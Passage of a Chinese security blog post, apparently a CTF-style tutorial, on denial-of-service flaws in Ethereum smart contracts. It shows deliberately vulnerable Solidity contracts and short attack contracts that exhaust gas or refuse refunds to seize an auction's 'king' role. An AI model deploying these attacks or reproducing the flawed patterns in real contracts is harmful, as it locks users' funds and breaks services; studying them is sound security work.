@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zpano.cn","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="简单的剖析一下智能合约拒绝服务漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约拒绝服务漏洞">
+<meta property="og:url" content="https://zpano.cn/2021/07/19/20/index.html">
+<meta property="og:site_name" content="Zpano&#39;s Blog">
+<meta property="og:description" content="简单的剖析一下智能合约拒绝服务漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zpano.cn/2021/07/19/20/202107190224.png">
+<meta property="og:image" content="https://zpano.cn/2021/07/19/20/截屏2021-07-19%2014.37.45.png">
+<meta property="article:published_time" content="2021-07-19T08:26:15.000Z">
+<meta property="article:modified_time" content="2021-09-08T08:43:40.000Z">
+<meta property="article:author" content="Zpano">
+<meta property="article:tag" content="区块链安全">
+<meta property="article:tag" content="智能合约安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zpano.cn/2021/07/19/20/202107190224.png">
+
+
+<link rel="canonical" href="https://zpano.cn/2021/07/19/20/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>智能合约拒绝服务漏洞 | Zpano's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Zpano's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">不负韶华，不负野心</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x02 预备知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.</span> <span class="nav-text">0x03 已知漏洞类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%9C%AA%E8%AE%BE%E5%AE%9Agas%E8%B4%B9%E7%8E%87%E7%9A%84%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x04 未设定gas费率的外部调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E4%BE%9D%E8%B5%96%E5%A4%96%E9%83%A8%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%9B%E5%B1%95"><span class="nav-number">5.</span> <span class="nav-text">0x05 依赖外部的调用进展</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-owner%E9%94%99%E8%AF%AF%E6%93%8D%E4%BD%9C"><span class="nav-number">6.</span> <span class="nav-text">0x06 owner错误操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-%E6%95%B0%E7%BB%84%E6%88%96%E6%98%A0%E5%B0%84%E8%BF%87%E9%95%BF"><span class="nav-number">7.</span> <span class="nav-text">0x07 数组或映射过长</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-%E4%BE%9D%E8%B5%96%E5%BA%93%E9%97%AE%E9%A2%98"><span class="nav-number">8.</span> <span class="nav-text">0x08 依赖库问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09-%E9%80%BB%E8%BE%91%E8%AE%BE%E8%AE%A1%E9%94%99%E8%AF%AF"><span class="nav-number">9.</span> <span class="nav-text">0x09 逻辑设计错误</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0a-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">10.</span> <span class="nav-text">0x0a 防御措施</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zpano"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Zpano</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zpano.cn/2021/07/19/20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Zpano">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zpano's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          智能合约拒绝服务漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-07-19 16:26:15" itemprop="dateCreated datePublished" datetime="2021-07-19T16:26:15+08:00">2021-07-19</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-09-08 16:43:40" itemprop="dateModified" datetime="2021-09-08T16:43:40+08:00">2021-09-08</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">区块链安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">简单的剖析一下智能合约拒绝服务漏洞</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>文章首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9871">先知社区</a></p>
+<p>拒绝服务漏洞，简称DOS，是一种旨在破坏正常的服务，使得服务中断或者暂停，导致用户无法访问或者使用服务</p>
+<p>同时在智能合约中也可能存在拒绝服务漏洞，使得发生锁币，无法正常竞拍等等现象发生，从而带来恶劣的影响。</p>
+<h1 id="0x02-预备知识"><a href="#0x02-预备知识" class="headerlink" title="0x02 预备知识"></a>0x02 预备知识</h1><p>本部分简略介绍应该掌握的知识点</p>
+<ul>
+<li>Send,Transfer</li>
+<li>Call,Delegatecall,Callcode</li>
+<li>函数修饰关键词</li>
+<li>Require,Revert</li>
+<li>合约继承</li>
+<li>数组和映射</li>
+<li>gas费率</li>
+</ul>
+<h1 id="0x03-已知漏洞类型"><a href="#0x03-已知漏洞类型" class="headerlink" title="0x03 已知漏洞类型"></a>0x03 已知漏洞类型</h1><p>本部分将归纳出现的拒绝服务漏洞类型</p>
+<ol>
+<li>未设定gas费率的外部调用</li>
+<li>依赖外部的调用进展</li>
+<li>owner错误操作</li>
+<li>数组或映射过长</li>
+<li>逻辑设计错误</li>
+<li>缺少依赖库</li>
+</ol>
+<p>下面将结合简单的示例或真实存在的受害合约进行分析</p>
+<h1 id="0x04-未设定gas费率的外部调用"><a href="#0x04-未设定gas费率的外部调用" class="headerlink" title="0x04 未设定gas费率的外部调用"></a>0x04 未设定gas费率的外部调用</h1><p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address payable public constant owner = address(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="built_in">this</span>).balance.div(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="built_in">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="built_in">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="built_in">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        assert(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x05-依赖外部的调用进展"><a href="#0x05-依赖外部的调用进展" class="headerlink" title="0x05 依赖外部的调用进展"></a>0x05 依赖外部的调用进展</h1><p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_king</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address payable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p>
+<p><img src="/2021/07/19/20/202107190224.png" alt="202107190224"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address target</span>) <span class="title">public</span> <span class="title">payable</span>&#123;</span><br><span class="line">        target.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//未定义fallback函数，就没有payable修饰</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/19/20/截屏2021-07-19 14.37.45.png" alt="截屏2021-07-19 14.37.45"></p>
+<h1 id="0x06-owner错误操作"><a href="#0x06-owner错误操作" class="headerlink" title="0x06 owner错误操作"></a>0x06 owner错误操作</h1><p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract error&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool activestatus;</span><br><span class="line">    </span><br><span class="line">    modifier onlyowner&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier active&#123;</span><br><span class="line">        <span class="built_in">require</span>(activestatus);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">activecontract</span>(<span class="params"></span>) <span class="title">onlyowner</span></span>&#123;</span><br><span class="line">        activestatus = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inactivecontract</span>(<span class="params"></span>) <span class="title">onlyowner</span></span>&#123;</span><br><span class="line">        activestatus = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params"></span>) <span class="title">active</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果owner调用了inactivecontract函数，使得activestatus变成false</p>
+<p>之后所有被active修饰的函数都无法调用，无法通过require判定</p>
+<p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p>
+<h1 id="0x07-数组或映射过长"><a href="#0x07-数组或映射过长" class="headerlink" title="0x07 数组或映射过长"></a>0x07 数组或映射过长</h1><p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; <span class="comment">// gets set somewhere</span></span><br><span class="line">    address[] investors; <span class="comment">// array of investors</span></span><br><span class="line">    uint[] investorTokens; <span class="comment">// the amount of tokens each investor gets</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... extra functionality, including transfertoken()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">invest</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * <span class="number">5</span>); <span class="comment">// 5 times the wei sent</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">distribute</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner); <span class="comment">// only owner</span></span><br><span class="line">        <span class="keyword">for</span>(uint i = <span class="number">0</span>; i &lt; investors.length; i++) &#123; </span><br><span class="line">            <span class="comment">// here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;</span></span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br>在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p>
